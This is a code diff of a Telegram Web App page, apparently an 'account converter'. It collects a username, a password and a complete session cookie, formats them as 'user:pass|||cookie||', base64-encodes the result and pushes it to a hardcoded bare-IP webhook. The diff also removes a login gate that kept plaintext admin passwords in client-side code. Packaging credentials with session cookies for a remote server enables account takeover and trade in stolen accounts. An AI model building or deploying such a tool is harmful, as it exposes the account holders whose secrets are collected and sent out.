@@ -3,206 +3,232 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>P.R.C. BD | 高级转换系统</title>
+  <title>高级账号转换器</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      --main-bg: #020617;
-      --card-bg: #0f172a;
+      --main-bg: #030712;
+      --card-bg: #111827;
       --accent-blue: #3b82f6;
-      --accent-glow: rgba(59, 130, 246, 0.4);
+      --accent-glow: rgba(59, 130, 246, 0.5);
       --success-green: #10b981;
-      --error-red: #ef4444;
-      --text-main: #f1f5f9;
+      --error-red: #f43f5e;
+      --text-main: #f8fafc;
       --text-dim: #94a3b8;
-      --border-color: #1e293b;
+      --border-color: #1f2937;
     }
 
     body {
-      margin: 0; background-color: var(--main-bg); color: var(--text-main);
+      margin: 0;
+      background-color: var(--main-bg);
+      color: var(--text-main);
       font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-      padding: 15px; min-height: 100vh; display: flex; justify-content: center;
+      padding: 16px;
+      overflow-x: hidden;
+      min-height: 100vh;
     }
 
-    .container { width: 100%; max-width: 480px; }
-    
-    .header { text-align: center; margin-bottom: 30px; padding-top: 20px; }
+    /* 🌊 Refresh Wave Effect */
+    #blur-layer {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(0px);
+      background: rgba(255, 255, 255, 0);
+      z-index: 2000;
+      pointer-events: none;
+      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .wave {
+      width: 0%; height: 0%;
+      background: radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 70%);
+      border-radius: 50%;
+      transition: 0.6s ease-out;
+    }
+
+    /* 📦 Main Container */
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+      padding-top: 10px;
+    }
     .header h1 {
-      font-size: 24px; margin: 0; font-weight: 800;
-      background: linear-gradient(135deg, #60a5fa, #2563eb);
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      font-size: 22px;
+      margin: 0;
+      background: linear-gradient(to right, #60a5fa, #3b82f6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
       letter-spacing: 1px;
     }
 
+    /* 📝 Input Cards */
     .card {
-      background: var(--card-bg); border: 1px solid var(--border-color);
-      border-radius: 28px; padding: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6);
-      transition: 0.4s ease;
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 24px;
+      padding: 24px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+      margin-bottom: 20px;
     }
 
-    .hidden { display: none !important; }
-
-    .field-group { margin-bottom: 20px; position: relative; }
+    .field-group { margin-bottom: 20px; }
     .field-group label {
-      display: block; font-size: 13px; color: var(--text-dim);
-      margin-bottom: 8px; margin-left: 5px; font-weight: 600;
+      display: block;
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 8px;
+      margin-left: 4px;
     }
 
     input, textarea {
-      width: 100%; background: #000; border: 2px solid var(--border-color);
-      border-radius: 16px; padding: 15px; color: #fff; font-size: 14px;
-      box-sizing: border-box; outline: none; transition: 0.3s;
+      width: 100%;
+      background: #000000;
+      border: 2px solid var(--border-color);
+      border-radius: 14px;
+      padding: 14px;
+      color: #fff;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+      transition: all 0.3s ease;
     }
-    input:focus { border-color: var(--accent-blue); box-shadow: 0 0 20px var(--accent-glow); }
 
+    /* 🔵 Blue Border Focus Effect */
+    input:focus, textarea:focus {
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 15px var(--accent-glow);
+      background: #020617;
+    }
+
+    /* 🔘 Buttons */
     .btn-stack { display: flex; flex-direction: column; gap: 12px; }
     .btn {
-      width: 100%; padding: 16px; border-radius: 18px; border: none;
-      font-size: 16px; font-weight: 700; cursor: pointer;
-      display: flex; align-items: center; justify-content: center; gap: 10px;
-      transition: 0.3s;
+      width: 100%;
+      padding: 16px;
+      border-radius: 16px;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.2s;
     }
-    .btn-primary { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.4); }
-    .btn-secondary { background: transparent; border: 2px solid var(--accent-blue); color: var(--accent-blue); }
-    .btn-logout { background: rgba(239, 68, 68, 0.1); color: var(--error-red); border: 1px solid var(--error-red); margin-top: 25px; font-size: 13px; padding: 12px; }
+    .btn-primary {
+      background: linear-gradient(135deg, #3b82f6, #2563eb);
+      color: white;
+      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+    }
+    .btn-secondary {
+      background: transparent;
+      border: 2px solid var(--accent-blue);
+      color: var(--accent-blue);
+    }
+    .btn:active { transform: scale(0.97); }
 
-    .btn:active { transform: scale(0.96); }
-
+    /* 📊 Status & Output */
     .status-area {
-      margin-top: 15px; padding: 14px; border-radius: 14px; font-size: 13px;
-      text-align: center; display: none;
+      margin-top: 15px;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 13px;
+      text-align: center;
+      display: none;
+      font-weight: 500;
     }
     .success { background: rgba(16, 185, 129, 0.1); color: var(--success-green); border: 1px solid var(--success-green); }
-    .error { background: rgba(239, 68, 68, 0.1); color: var(--error-red); border: 1px solid var(--error-red); }
+    .error { background: rgba(244, 63, 94, 0.1); color: var(--error-red); border: 1px solid var(--error-red); }
 
     .output-preview {
-      margin-top: 20px; font-family: 'Courier New', monospace; font-size: 11px; color: #60a5fa;
-      background: #000; padding: 15px; border-radius: 15px; word-break: break-all; display: none;
-      border: 1px dashed var(--accent-blue);
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #60a5fa;
+      background: #000;
+      padding: 10px;
+      border-radius: 10px;
+      word-break: break-all;
+      display: none;
     }
 
+    /* 🌀 Floating Fan */
     .fan-trigger {
-      position: fixed; right: 20px; bottom: 30px; width: 60px; height: 60px;
-      background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white;
-      border-radius: 50%; display: flex; align-items: center; justify-content: center;
-      font-size: 24px; cursor: pointer; box-shadow: 0 0 25px var(--accent-glow); z-index: 100;
+      position: fixed;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 60px; height: 60px;
+      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+      color: white;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+      box-shadow: 0 0 20px var(--accent-glow);
+      z-index: 2001;
     }
-    .rotate-anim { animation: fanRotate 0.6s linear; }
-    @keyframes fanRotate { 100% { transform: rotate(360deg); } }
+    .rotate-anim { animation: fanRotate 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+    @keyframes fanRotate { 100% { transform: translateY(-50%) rotate(720deg); } }
   </style>
 </head>
 <body>
 
+  <div id="blur-layer"><div class="wave" id="wave"></div></div>
+
+  <div class="fan-trigger" id="fan" onclick="runRefresh()">
+    <i class="fas fa-fan"></i>
+  </div>
+
   <div class="container">
     <div class="header">
-      <h1 id="uiTitle">系统身份验证</h1>
+      <h1>账号格式转换系统</h1>
     </div>
 
-    <div id="loginView" class="card">
+    <div class="card">
       <div class="field-group">
-        <label><i class="fas fa-user-shield"></i> 管理员账号 (Username)</label>
-        <input type="text" id="adminUser" placeholder="请输入管理员账号">
+        <label>用户名 (Username)</label>
+        <input type="text" id="user" placeholder="请输入用户名">
       </div>
-      <div class="field-group">
-        <label><i class="fas fa-key"></i> 访问密码 (Password)</label>
-        <input type="password" id="adminPass" placeholder="请输入密码">
-      </div>
-      <button class="btn btn-primary" onclick="handleAuth()">
-        <i class="fas fa-sign-in-alt"></i> 验证并登录
-      </button>
-      <div id="authStatus" class="status-area"></div>
-    </div>
 
-    <div id="mainView" class="card hidden">
       <div class="field-group">
-        <label>账户用户名 (Account User)</label>
-        <input type="text" id="user" placeholder="输入用户名">
+        <label>登录密码 (Password)</label>
+        <input type="password" id="pass" placeholder="请输入密码">
       </div>
+
       <div class="field-group">
-        <label>登录密码 (Account Pass)</label>
-        <input type="password" id="pass" placeholder="输入密码">
-      </div>
-      <div class="field-group">
-        <label>Cookie 数据 (Cookie Data)</label>
+        <label>Cookie 数据</label>
         <textarea id="cookie" rows="4" placeholder="在此粘贴完整的 Cookie 内容"></textarea>
       </div>
-      
+
       <div class="btn-stack">
         <button class="btn btn-primary" onclick="processConversion()">
-          <i class="fas fa-sync-alt"></i> 立即转换格式
+          <i class="fas fa-exchange-alt"></i> 立即开始转换
         </button>
         <button class="btn btn-secondary" onclick="processPush()">
-          <i class="fas fa-cloud-upload-alt"></i> 推送到服务器
+          <i class="fas fa-rocket"></i> 将数据推送到服务器
         </button>
       </div>
 
       <div id="statusBox" class="status-area"></div>
       <div id="resultPreview" class="output-preview"></div>
-
-      <button class="btn btn-logout" onclick="handleLogout()">
-        <i class="fas fa-power-off"></i> 退出登录 (Logout)
-      </button>
     </div>
-  </div>
-
-  <div class="fan-trigger" id="fan" onclick="runRefresh()">
-    <i class="fas fa-fan"></i>
   </div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // 📋 预设的管理员数据库 (10 Sets)
-    const ADMIN_DB = {
-      "rakib_admin": "p12345",
-      "prc_bd_01": "p67890",
-      "galaxy_prince": "star77",
-      "admin_8263": "pass82",
-      "vip_user_05": "vip555",
-      "premium_dev": "dev99",
-      "cloud_root": "root11",
-      "secure_access": "safe00",
-      "master_rakib": "mstr22",
-      "alpha_node": "node44"
-    };
-
-    window.onload = () => {
-      if (localStorage.getItem('prc_session') === 'active') {
-        showMainUI();
-      }
-    };
-
-    function handleAuth() {
-      const u = document.getElementById('adminUser').value.trim();
-      const p = document.getElementById('adminPass').value.trim();
-      const status = document.getElementById('authStatus');
-
-      if (ADMIN_DB[u] && ADMIN_DB[u] === p) {
-         localStorage.setItem('prc_session', 'active');
-         status.style.display = 'block';
-         status.className = 'status-area success';
-         status.innerHTML = "✅ 验证通过，正在进入系统...";
-         setTimeout(showMainUI, 800);
-      } else {
-         status.style.display = 'block';
-         status.className = 'status-area error';
-         status.innerHTML = "❌ 账号或密码错误，请重新输入";
-      }
-    }
-
-    function showMainUI() {
-      document.getElementById('loginView').classList.add('hidden');
-      document.getElementById('mainView').classList.remove('hidden');
-      document.getElementById('uiTitle').innerText = "高级账号转换系统";
-    }
-
-    function handleLogout() {
-      localStorage.removeItem('prc_session');
-      location.reload();
-    }
-
+    // 核心转换逻辑 (Conversion Logic)
     function processConversion() {
       const u = document.getElementById('user').value.trim();
       const p = document.getElementById('pass').value.trim();
@@ -210,25 +236,30 @@
       const status = document.getElementById('statusBox');
       const preview = document.getElementById('resultPreview');
 
+      // 验证: 必填项检查及 Cookie 格式验证
       if (!u || !p || !c || !c.includes('=')) {
         updateStatus('❌ 验证失败：请确保所有项已填写且 Cookie 格式正确', true);
+        preview.style.display = 'none';
         return;
       }
 
-      const formatted = `${u}:${p}|||${c}||`;
-      window.savedData = formatted;
-      preview.textContent = formatted;
+      // 转换格式: user:pass|||cookie||
+      const finalString = `${u}:${p}|||${c}||`;
+      window.savedData = finalString;
+
+      preview.textContent = finalString;
       preview.style.display = 'block';
-      updateStatus('✅ 格式转换成功：数据已就绪', false);
+      updateStatus('✅ 转换成功：数据已锁定并准备推送', false);
     }
 
+    // 推送逻辑 (Push Logic)
     async function processPush() {
       if (!window.savedData) {
-        updateStatus('⚠️ 请先点击转换按钮', true);
+        updateStatus('⚠️ 错误：请先完成格式转换', true);
         return;
       }
 
-      updateStatus('⏳ 正在同步到 P.R.C 云端...', false);
+      updateStatus('⏳ 正在连接服务器，请稍候...', false);
       const endpoint = 'http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push';
       const payload = `accounts=${btoa(window.savedData)}`;
 
@@ -240,34 +271,50 @@
         });
 
         if (response.ok) {
-          const res = await response.json();
-          updateStatus(`🚀 推送成功 | 成功: ${res.data.success_count} | 失败: ${res.data.failed_count}`, false);
+          const json = await response.json();
+          const d = json.data;
+          updateStatus(`🚀 推送完成 | 成功: ${d.success_count} | 失败: ${d.failed_count}`, d.failed_count > 0);
         } else {
-          updateStatus('❌ 服务器拒绝连接', true);
+          updateStatus('❌ 推送失败：服务器响应异常', true);
         }
       } catch (err) {
-        updateStatus('❌ 网络错误：无法连接到 API', true);
+        updateStatus(`❌ 网络错误: ${err.message}`, true);
       }
     }
 
+    // 刷新动画 (Professional Refresh)
     function runRefresh() {
       const fan = document.getElementById('fan');
+      const blur = document.getElementById('blur-layer');
+      const wave = document.getElementById('wave');
+
       fan.classList.add('rotate-anim');
+      blur.style.backdropFilter = 'blur(15px)';
+      blur.style.background = 'rgba(15, 23, 42, 0.4)';
+      wave.style.width = '300%'; wave.style.height = '300%';
+
       setTimeout(() => {
         document.getElementById('user').value = '';
         document.getElementById('pass').value = '';
         document.getElementById('cookie').value = '';
         document.getElementById('statusBox').style.display = 'none';
         document.getElementById('resultPreview').style.display = 'none';
+        window.savedData = null;
+      }, 300);
+
+      setTimeout(() => {
         fan.classList.remove('rotate-anim');
-      }, 600);
+        blur.style.backdropFilter = 'blur(0px)';
+        blur.style.background = 'rgba(255, 255, 255, 0)';
+        wave.style.width = '0%'; wave.style.height = '0%';
+      }, 700);
     }
 
-    function updateStatus(msg, isErr) {
+    function updateStatus(msg, isError) {
       const box = document.getElementById('statusBox');
       box.style.display = 'block';
-      box.className = `status-area ${isErr ? 'error' : 'success'}`;
       box.innerHTML = msg;
+      box.className = `status-area ${isError ? 'error' : 'success'}`;
     }
   </script>
 </body>
